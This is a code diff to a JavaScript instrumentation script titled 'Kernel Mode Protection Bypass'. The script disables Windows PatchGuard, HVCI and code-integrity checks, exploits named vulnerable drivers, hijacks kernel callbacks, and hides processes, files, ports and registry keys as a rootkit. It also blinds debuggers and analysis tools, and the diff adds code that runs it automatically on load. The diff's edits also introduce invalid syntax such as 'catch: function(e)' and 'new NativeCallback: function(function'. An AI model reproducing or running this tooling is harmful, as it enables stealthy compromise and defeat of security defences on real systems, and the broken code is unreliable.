@@ -27,7 +27,7 @@
  * License: GPL v3
  */
 
-{
+const KernelModeBypass = {
     name: "Kernel Mode Protection Bypass",
     description: "Advanced kernel-level protection mechanism bypass",
     version: "2.0.0",
@@ -179,7 +179,7 @@
 
                 spoofSsdtInformation: function() {
                     try {
-                        switch(this.systemInformationClass) {
+                        switch: function(this.systemInformationClass) {
                             case 11: // SystemModuleInformation
                                 this.spoofModuleInformation();
                                 break;
@@ -203,7 +203,7 @@
                                 });
                                 break;
                         }
-                    } catch(e) {
+                    } catch: function(e) {
                         send({
                             type: "error",
                             target: "kernel_mode_bypass",
@@ -257,7 +257,7 @@
 
                                 filteredCount++;
 
-                            } catch(e) {
+                            } catch: function(e) {
                                 // Module name read failed - include it anyway
                                 filteredCount++;
                             }
@@ -654,7 +654,7 @@
                                         unicode_string: unicodeString
                                     });
                                 }
-                            } catch(e) {
+                            } catch: function(e) {
                                 // Unicode string read failed
                             }
                         }
@@ -1460,7 +1460,7 @@
                                     });
                                     this.blockAccess = true;
                                 }
-                            } catch(e) {
+                            } catch: function(e) {
                                 // Directory name read failed
                             }
                         }
@@ -1642,9 +1642,9 @@
                 message: "Advanced kernel protection bypass is now ACTIVE!"
             });
         }, 100);
-    }
+    },
 
-    initializeAdvancedKernelPatchGuardBypass() {
+    initializeAdvancedKernelPatchGuardBypass: function() {
         const pgContext = {
             timingPatterns: [],
             checksumLocations: new Map(),
@@ -1687,7 +1687,7 @@
                         Memory.copy(decoyPage, checksumRoutine, 0x1000);
                         pgContext.decoyPages.push(decoyPage);
 
-                        Interceptor.replace(checksumRoutine, new NativeCallback(function() {
+                        Interceptor.replace(checksumRoutine, new NativeCallback: function(function() {
                             return 0;
                         }, 'int', []));
                     }
@@ -1721,9 +1721,9 @@
         this.injectPatchGuardDecoy();
         this.setupTimingAttackMitigation();
         this.installKPPBypass();
-    }
+    },
 
-    setupModernDriverExploitationEngine() {
+    setupModernDriverExploitationEngine: function() {
         const vulnerableDrivers = [
             { name: 'dbutil_2_3.sys', ioctl: 0x9B0C1EC4, exploit: this.exploitDBUtil },
             { name: 'cpuz_driver.sys', ioctl: 0x9C402088, exploit: this.exploitCPUZ },
@@ -1778,9 +1778,9 @@
 
         this.setupDriverCommunicationChannel();
         this.installPersistentKernelImplant();
-    }
+    },
 
-    initializeHypervisorLevelEvasion() {
+    initializeHypervisorLevelEvasion: function() {
         const hvciStatus = this.checkHVCIStatus();
         if (!hvciStatus.enabled) return;
 
@@ -1834,9 +1834,9 @@
         this.installNestedVirtualization();
         this.bypassSecureKernelCommunication();
         this.setupHypervisorRootkit();
-    }
+    },
 
-    setupAdvancedMemoryManipulation() {
+    setupAdvancedMemoryManipulation: function() {
         const cr0 = this.readCR0();
         const wpBit = 0x10000;
 
@@ -1907,9 +1907,9 @@
 
         this.setupKernelMemoryPool();
         this.installMemoryHidingRootkit();
-    }
+    },
 
-    initializeKernelCallbackHijacking() {
+    initializeKernelCallbackHijacking: function() {
         const callbackTypes = [
             'PsSetCreateProcessNotifyRoutine',
             'PsSetCreateThreadNotifyRoutine',
@@ -1940,7 +1940,7 @@
 
                 callbacks.push({ handler, context, index: i });
 
-                const replacement = new NativeCallback(function(a1, a2, a3) {
+                const replacement = new NativeCallback: function(function(a1, a2, a3) {
                     const shouldBlock = this.evaluateCallbackContext(arguments);
                     if (shouldBlock) {
                         return 0;
@@ -1972,7 +1972,7 @@
                 0x90, 0x90, 0x90, 0x90
             ];
 
-            const filterFunction = new NativeCallback(function(a1, a2, a3) {
+            const filterFunction = new NativeCallback: function(function(a1, a2, a3) {
                 const process = Process.getCurrentProcess();
                 if (this.isProtectedProcess(process)) {
                     return 0;
@@ -1987,9 +1987,9 @@
 
         this.redirectObjectCallbacks();
         this.installFilterDriverBypass();
-    }
+    },
 
-    setupAdvancedRootkitCapabilities() {
+    setupAdvancedRootkitCapabilities: function() {
         const hiddenProcesses = new Set();
         const hiddenFiles = new Set();
         const hiddenRegistry = new Set();
@@ -2018,7 +2018,7 @@
         if (tcpTable) {
             const originalEnum = tcpTable.add(0x10).readPointer();
 
-            Interceptor.replace(originalEnum, new NativeCallback(function(table, size) {
+            Interceptor.replace(originalEnum, new NativeCallback: function(function(table, size) {
                 const result = originalEnum(table, size);
 
                 if (result && table) {
@@ -2060,7 +2060,7 @@
 
             const original = callback.address.readPointer();
 
-            Interceptor.replace(callback.address, new NativeCallback(function(a1, a2, a3, a4, a5) {
+            Interceptor.replace(callback.address, new NativeCallback: function(function(a1, a2, a3, a4, a5) {
                 const fileName = a2 ? a2.readUtf16String() : null;
 
                 if (fileName && Array.from(hiddenFiles).some(f => fileName.includes(f))) {
@@ -2079,9 +2079,9 @@
         this.rootkit.hideFile = (path) => hiddenFiles.add(path);
         this.rootkit.hidePort = (port) => hiddenNetwork.add(port);
         this.rootkit.hideRegistry = (key) => hiddenRegistry.add(key);
-    }
+    },
 
-    initializeKernelDebuggingCountermeasures() {
+    initializeKernelDebuggingCountermeasures: function() {
         const kdDebuggerEnabled = DebugSymbol.fromName('KdDebuggerEnabled');
         if (kdDebuggerEnabled) {
             kdDebuggerEnabled.address.writeU8(0);
@@ -2119,7 +2119,7 @@
 
         const int3Handler = DebugSymbol.fromName('KiBreakpointTrap');
         if (int3Handler) {
-            const replacement = new NativeCallback(function() {
+            const replacement = new NativeCallback: function(function() {
                 return 0;
             }, 'void', []);
 
@@ -2142,9 +2142,9 @@
 
         this.installAntiStepOverProtection();
         this.disableKernelDebugObjects();
-    }
+    },
 
-    setupAdvancedHVCIBypass() {
+    setupAdvancedHVCIBypass: function() {
         const ciOptions = DebugSymbol.fromName('g_CiOptions');
         if (ciOptions) {
             const options = ciOptions.address.readU32();
@@ -2164,7 +2164,7 @@
         if (wdFilter) {
             const verifyFunction = wdFilter.base.add(0x8A30);
 
-            Interceptor.replace(verifyFunction, new NativeCallback(function() {
+            Interceptor.replace(verifyFunction, new NativeCallback: function(function() {
                 return 0;
             }, 'int', ['pointer', 'uint32']));
         }
@@ -2179,7 +2179,7 @@
             const func = DebugSymbol.fromName(funcName);
             if (!func) return;
 
-            Interceptor.replace(func.address, new NativeCallback(function() {
+            Interceptor.replace(func.address, new NativeCallback: function(function() {
                 return 0;
             }, 'int', ['pointer', 'pointer', 'uint32']));
         });
@@ -2196,9 +2196,9 @@
 
         this.patchSecureKernel();
         this.disableVBS();
-    }
+    },
 
-    initializeKernelCFIBypass() {
+    initializeKernelCFIBypass: function() {
         const cfgBitmap = this.locateCFGBitmap();
         if (!cfgBitmap) return;
 
@@ -2247,9 +2247,9 @@
 
         this.installCFIExceptionHandler();
         this.patchControlFlowGuard();
-    }
+    },
 
-    setupAdvancedKernelStealth() {
+    setupAdvancedKernelStealth: function() {
         const kernelBase = this.getKernelBase();
         if (!kernelBase) return;
 
@@ -2280,7 +2280,7 @@
             stealthContext.hooks.set(api, original);
 
             const detour = Memory.alloc(0x100);
-            const detector = new NativeCallback(function() {
+            const detector = new NativeCallback: function(function() {
                 const caller = this.context.lr || this.context.rip;
 
                 if (this.isAnalysisTool(caller)) {
@@ -2313,4 +2313,20 @@
         this.installTimingObfuscation();
         this.setupDecoyDrivers();
     }
+
+};
+
+// Auto-initialize on load
+setTimeout(function() {
+    KernelModeBypass.run();
+    send({
+        type: "status",
+        target: "kernel_mode_bypass",
+        action: "system_now_active"
+    });
+}, 100);
+
+// Export for use in other modules or direct execution
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = KernelModeBypass;
 }
